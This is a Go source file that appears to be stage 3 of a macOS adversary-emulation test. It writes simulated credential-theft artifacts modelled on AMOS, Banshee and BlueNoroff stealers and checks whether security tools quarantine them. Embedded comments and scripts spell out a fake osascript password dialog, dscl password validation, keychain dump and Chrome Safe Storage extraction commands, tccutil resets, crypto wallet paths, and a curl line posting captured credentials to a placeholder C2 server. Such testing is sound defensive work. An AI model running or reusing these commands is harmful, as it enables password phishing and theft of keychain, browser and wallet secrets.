//go:build darwin
// +build darwin

/*
STAGE 3: Credential Harvesting via AppleScript & Keychain Access (T1059.002, T1555.001, T1056.002)
Simulates osascript fake password dialog (AMOS/Banshee/BlueNoroff shared pattern),
Keychain access via security CLI, browser credential extraction, and
crypto wallet data theft targeting MetaMask, Coinbase, Exodus.
Primary technique mapped: T1059.002 (AppleScript execution)
*/

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "244dfb88-9068-4db4-9fa8-dbc49517f63d"
	TECHNIQUE_ID   = "T1059.002"
	TECHNIQUE_NAME = "Command and Scripting Interpreter: AppleScript"
	STAGE_ID       = 3
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

// SimulatedCredential represents a harvested credential
type SimulatedCredential struct {
	Source    string `json:"source"`
	Type     string `json:"type"`
	Account  string `json:"account"`
	Data     string `json:"data"`
	Note     string `json:"note"`
}

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Simulate credential harvesting via osascript, Keychain, and crypto wallets")

	fmt.Printf("[STAGE %s] Starting Credential Harvesting\n", TECHNIQUE_ID)

	if err := performTechnique(); err != nil {
		if isBlockedError(err) {
			fmt.Printf("[STAGE %s] Technique blocked: %v\n", TECHNIQUE_ID, err)
			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Technique blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			os.Exit(StageBlocked)
		}

		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		os.Exit(StageError)
	}

	fmt.Printf("[STAGE %s] Credential harvesting completed successfully\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, "Credential harvesting completed without prevention")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Credential harvesting completed without prevention")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	targetDir := "/tmp/F0"
	artifactDir := "/Users/fortika-test"
	stagingDir := filepath.Join(targetDir, "credential_staging")

	if err := os.MkdirAll(stagingDir, 0755); err != nil {
		return fmt.Errorf("failed to create staging directory: %v", err)
	}
	if err := os.MkdirAll(artifactDir, 0755); err != nil {
		return fmt.Errorf("failed to create artifact directory: %v", err)
	}

	var allCredentials []SimulatedCredential

	// --- Phase 1: osascript Fake Password Dialog ---
	LogMessage("INFO", TECHNIQUE_ID, "Phase 1: Simulating osascript fake password dialog")
	fmt.Printf("[STAGE %s] Phase 1: osascript fake password dialog\n", TECHNIQUE_ID)

	// This is the exact AppleScript pattern used by AMOS, Banshee, and BlueNoroff
	osascriptDialog := `-- SIMULATION: osascript Fake Password Dialog
-- Used by: AMOS Stealer, Banshee Stealer, RustBucket/BlueNoroff
-- Technique: T1056.002 - GUI Input Capture

-- Real attack would use:
-- osascript -e 'display dialog "macOS needs your password to update system preferences" ¬
--   with title "System Preferences" ¬
--   default answer "" ¬
--   with hidden answer ¬
--   with icon caution ¬
--   buttons {"Cancel", "OK"} default button "OK"'

-- After capture, credential validated via dscl:
-- dscl /Local/Default -authonly <username> <captured_password>

set simulatedPassword to "Simulated-P@ssw0rd-F0RT1KA"
set dialogResult to "User entered password (simulated)"

-- In real attack, password is sent to C2 server
-- curl -X POST "https://C2_SERVER/creds" -d "user=$USER&pass=$simulatedPassword"
`

	osascriptPath := filepath.Join(artifactDir, "password_prompt.applescript")
	if err := os.WriteFile(osascriptPath, []byte(osascriptDialog), 0644); err != nil {
		return fmt.Errorf("failed to write osascript dialog: %v", err)
	}

	// Simulate credential validation script
	dsclValidation := `#!/bin/bash
# SIMULATION: Credential validation via dscl
# Real attack validates captured password:
# dscl /Local/Default -authonly "$USER" "$CAPTURED_PASSWORD"

USERNAME="$(whoami)"
echo "[*] Validating credentials for: ${USERNAME}"
echo "[*] Method: dscl /Local/Default -authonly"
echo "[+] Credential validation: SIMULATED (no actual auth attempt)"
`

	dsclPath := filepath.Join(targetDir, "validate_creds.sh")
	if err := os.WriteFile(dsclPath, []byte(dsclValidation), 0755); err != nil {
		return fmt.Errorf("failed to write dscl validation script: %v", err)
	}

	allCredentials = append(allCredentials, SimulatedCredential{
		Source:  "osascript-dialog",
		Type:    "password",
		Account: "localuser@mac",
		Data:    "Simulated-P@ssw0rd-F0RT1KA",
		Note:    "Captured via fake System Preferences dialog (T1056.002)",
	})

	LogMessage("INFO", TECHNIQUE_ID, "Created osascript password dialog simulation")

	// Verify artifacts survived
	time.Sleep(2 * time.Second)
	if _, err := os.Stat(osascriptPath); os.IsNotExist(err) {
		return fmt.Errorf("osascript dialog quarantined: blocked by security controls")
	}

	// --- Phase 2: Keychain Access Simulation ---
	LogMessage("INFO", TECHNIQUE_ID, "Phase 2: Simulating Keychain access (T1555.001)")
	fmt.Printf("[STAGE %s] Phase 2: Keychain access simulation\n", TECHNIQUE_ID)

	// Simulate commands that would be used to enumerate and dump Keychain
	keychainCommands := `#!/bin/bash
# SIMULATION: macOS Keychain Access
# Technique: T1555.001 - Credentials from Password Stores: Keychain
# Used by: AMOS, Banshee, BlueNoroff malware families

# Step 1: List available keychains
echo "[*] Listing keychains..."
# security list-keychains

# Step 2: Dump keychain entries (requires password or TCC bypass)
echo "[*] Dumping login keychain..."
# security dump-keychain -d ~/Library/Keychains/login.keychain-db

# Step 3: Extract Chrome Safe Storage key
echo "[*] Extracting Chrome Safe Storage key..."
# security find-generic-password -ga "Chrome" -w 2>&1

# Step 4: Extract specific credentials
echo "[*] Searching for crypto exchange credentials..."
# security find-internet-password -s "coinbase.com" -g 2>&1
# security find-internet-password -s "binance.com" -g 2>&1
# security find-internet-password -s "kraken.com" -g 2>&1

echo "[+] Keychain enumeration complete (simulated)"
`

	keychainScriptPath := filepath.Join(targetDir, "keychain_dump.sh")
	if err := os.WriteFile(keychainScriptPath, []byte(keychainCommands), 0755); err != nil {
		return fmt.Errorf("failed to write keychain dump script: %v", err)
	}

	// Create simulated keychain dump output
	keychainDump := `# Simulated Keychain Dump Output
# security dump-keychain -d ~/Library/Keychains/login.keychain-db

keychain: "/Users/target/Library/Keychains/login.keychain-db"
version: 512
class: "inet"
attributes:
    "acct"<blob>="user@coinbase.com"
    "atyp"<blob>="form"
    "desc"<blob>="Web form password"
    "srvr"<blob>="www.coinbase.com"
    "ptcl"<uint32>="htps"
data: "SIMULATED_PASSWORD_F0RT1KA"

class: "genp"
attributes:
    "acct"<blob>="Chrome Safe Storage"
    "svce"<blob>="Chrome Safe Storage"
    "desc"<blob>="Chrome Safe Storage"
data: "SIMULATED_CHROME_KEY_F0RT1KA"

class: "inet"
attributes:
    "acct"<blob>="admin@kraken.com"
    "srvr"<blob>="www.kraken.com"
data: "SIMULATED_PASSWORD_F0RT1KA"
`

	keychainDumpPath := filepath.Join(stagingDir, "keychain_dump.txt")
	if err := os.WriteFile(keychainDumpPath, []byte(keychainDump), 0644); err != nil {
		return fmt.Errorf("failed to write keychain dump: %v", err)
	}

	allCredentials = append(allCredentials,
		SimulatedCredential{
			Source:  "keychain",
			Type:    "web-password",
			Account: "user@coinbase.com",
			Data:    "SIMULATED_PASSWORD_F0RT1KA",
			Note:    "Extracted from login.keychain-db (T1555.001)",
		},
		SimulatedCredential{
			Source:  "keychain",
			Type:    "chrome-safe-storage",
			Account: "Chrome Safe Storage",
			Data:    "SIMULATED_CHROME_KEY_F0RT1KA",
			Note:    "Chrome encryption key for Login Data decryption",
		},
	)

	LogMessage("INFO", TECHNIQUE_ID, "Created Keychain access simulation with dump output")

	// --- Phase 3: Browser Credential Extraction ---
	LogMessage("INFO", TECHNIQUE_ID, "Phase 3: Simulating browser credential extraction")
	fmt.Printf("[STAGE %s] Phase 3: Browser credential extraction\n", TECHNIQUE_ID)

	// Simulate Chrome Login Data extraction
	browserCreds := `# Simulated Browser Credential Extraction
# Chrome Login Data: ~/Library/Application Support/Google/Chrome/Default/Login Data
# Decrypted using Chrome Safe Storage key from Keychain

URL,Username,Password
https://www.coinbase.com/signin,investor@email.com,SIMULATED_PASS_1
https://www.binance.com/login,trader@email.com,SIMULATED_PASS_2
https://www.kraken.com/sign-in,whale@email.com,SIMULATED_PASS_3
https://metamask.io,crypto_user@email.com,SIMULATED_PASS_4
https://mail.google.com,target_user@gmail.com,SIMULATED_PASS_5
`

	browserCredsPath := filepath.Join(stagingDir, "browser_credentials.csv")
	if err := os.WriteFile(browserCredsPath, []byte(browserCreds), 0644); err != nil {
		return fmt.Errorf("failed to write browser credentials: %v", err)
	}

	allCredentials = append(allCredentials,
		SimulatedCredential{
			Source:  "chrome-login-data",
			Type:    "web-password",
			Account: "investor@email.com",
			Data:    "SIMULATED_PASS_1",
			Note:    "Coinbase credentials from Chrome (BlueNoroff primary target)",
		},
	)

	LogMessage("INFO", TECHNIQUE_ID, "Created browser credential extraction simulation")

	// --- Phase 4: Crypto Wallet Data Theft ---
	LogMessage("INFO", TECHNIQUE_ID, "Phase 4: Simulating crypto wallet data theft (BlueNoroff primary objective)")
	fmt.Printf("[STAGE %s] Phase 4: Crypto wallet data theft\n", TECHNIQUE_ID)

	// BlueNoroff specifically targets blockchain engineers and crypto wallets
	walletData := map[string]string{
		"metamask_vault.json": `{
  "simulation": true,
  "wallet": "MetaMask",
  "path": "~/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
  "vault_data": {
    "data": "SIMULATED_ENCRYPTED_VAULT_DATA_F0RT1KA",
    "iv": "SIMULATED_IV_F0RT1KA",
    "salt": "SIMULATED_SALT_F0RT1KA"
  },
  "note": "MetaMask vault requires password to decrypt - BlueNoroff uses osascript to phish it"
}`,
		"exodus_wallet.json": `{
  "simulation": true,
  "wallet": "Exodus",
  "path": "~/Library/Application Support/Exodus/exodus.wallet",
  "seed_data": "SIMULATED_SEED_PHRASE_F0RT1KA abandon abandon abandon abandon abandon abandon",
  "private_keys": ["SIMULATED_KEY_1", "SIMULATED_KEY_2"],
  "balances": {"BTC": "2.5 (simulated)", "ETH": "15.3 (simulated)"},
  "note": "Exodus stores wallet data locally - prime target for DPRK"
}`,
		"coinbase_wallet.json": `{
  "simulation": true,
  "wallet": "Coinbase Wallet",
  "path": "~/Library/Application Support/Google/Chrome/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad",
  "recovery_phrase": "SIMULATED twelve word recovery phrase for the wallet F0RT1KA test",
  "note": "Coinbase Wallet browser extension - cryptocurrency theft target"
}`,
	}

	walletDir := filepath.Join(stagingDir, "crypto_wallets")
	if err := os.MkdirAll(walletDir, 0755); err != nil {
		return fmt.Errorf("failed to create wallet staging directory: %v", err)
	}

	for filename, content := range walletData {
		walletPath := filepath.Join(walletDir, filename)
		if err := os.WriteFile(walletPath, []byte(content), 0644); err != nil {
			return fmt.Errorf("failed to write wallet data %s: %v", filename, err)
		}
	}

	allCredentials = append(allCredentials,
		SimulatedCredential{
			Source:  "metamask-vault",
			Type:    "crypto-wallet",
			Account: "MetaMask Vault",
			Data:    "SIMULATED_ENCRYPTED_VAULT_DATA_F0RT1KA",
			Note:    "MetaMask browser extension vault (BlueNoroff primary target)",
		},
		SimulatedCredential{
			Source:  "exodus-wallet",
			Type:    "crypto-wallet",
			Account: "Exodus Wallet",
			Data:    "SIMULATED_SEED_PHRASE_F0RT1KA",
			Note:    "Exodus desktop wallet seed phrase",
		},
	)

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Staged %d crypto wallet files", len(walletData)))

	// --- Phase 5: TCC Manipulation Simulation ---
	LogMessage("INFO", TECHNIQUE_ID, "Phase 5: Simulating TCC manipulation (tccutil reset)")
	fmt.Printf("[STAGE %s] Phase 5: TCC manipulation simulation\n", TECHNIQUE_ID)

	tccScript := `#!/bin/bash
# SIMULATION: TCC (Transparency, Consent, and Control) Manipulation
# Used by macOS malware to reset permissions and re-prompt for access

# Reset AppleEvents permissions (allows osascript to control other apps)
# tccutil reset AppleEvents

# In some variants, malware also attempts:
# tccutil reset SystemPolicyAllFiles  # Full Disk Access
# tccutil reset Accessibility         # Accessibility permissions

echo "[*] TCC manipulation simulated (no actual tccutil commands executed)"
echo "[*] In real attack: tccutil reset AppleEvents allows cross-app scripting"
`

	tccScriptPath := filepath.Join(targetDir, "tcc_manipulation.sh")
	if err := os.WriteFile(tccScriptPath, []byte(tccScript), 0755); err != nil {
		return fmt.Errorf("failed to write TCC manipulation script: %v", err)
	}

	// --- Save aggregated credentials ---
	credentialsSummary, err := json.MarshalIndent(allCredentials, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal credentials: %v", err)
	}

	credsSummaryPath := filepath.Join(stagingDir, "harvested_credentials.json")
	if err := os.WriteFile(credsSummaryPath, credentialsSummary, 0644); err != nil {
		return fmt.Errorf("failed to write credentials summary: %v", err)
	}

	// Verify all critical artifacts survived
	time.Sleep(2 * time.Second)
	criticalArtifacts := []string{credsSummaryPath, keychainDumpPath, browserCredsPath}
	for _, artifact := range criticalArtifacts {
		if _, err := os.Stat(artifact); os.IsNotExist(err) {
			return fmt.Errorf("credential artifact quarantined: %s removed by security controls", filepath.Base(artifact))
		}
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, fmt.Sprintf("Harvested %d credentials across %d sources", len(allCredentials), 4))
	return nil
}

func isBlockedError(err error) bool {
	if err == nil {
		return false
	}
	errStr := strings.ToLower(err.Error())
	blockIndicators := []string{
		"access denied", "access is denied", "permission denied",
		"blocked", "prevented", "quarantined", "removed by security",
	}
	for _, indicator := range blockIndicators {
		if strings.Contains(errStr, indicator) {
			return true
		}
	}
	return false
}
